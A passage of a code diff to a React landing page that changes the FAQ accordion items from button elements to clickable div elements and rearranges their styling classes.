 												<td className="px-6 py-5">
@@ -1808,12 +1648,11 @@ export default function LandingPage() {
 						{faqItems.map((item) => {
 							const isOpen = openFaq === item.question;
 							return (
-								<button
+								<div
 									key={item.question}
 									data-faq={item.question}
-									className="faq-item liquid-glass w-full rounded-3xl border border-white/5 p-6 text-left opacity-0 md:p-8"
+									className="faq-item liquid-glass rounded-3xl p-6 md:p-8 cursor-pointer border border-white/5 opacity-0"
 									onClick={() => toggleFaq(item.question)}
-									type="button"
 								>
 									<div className="flex items-center justify-between gap-4">
 										<h4 className="text-xl md:text-2xl font-heading italic text-white">
@@ -1834,7 +1673,7 @@ export default function LandingPage() {
 											{item.answer}
 										</p>
 									</div>
-								</button>
+								</div>
 							);
 						})}
 					</div>
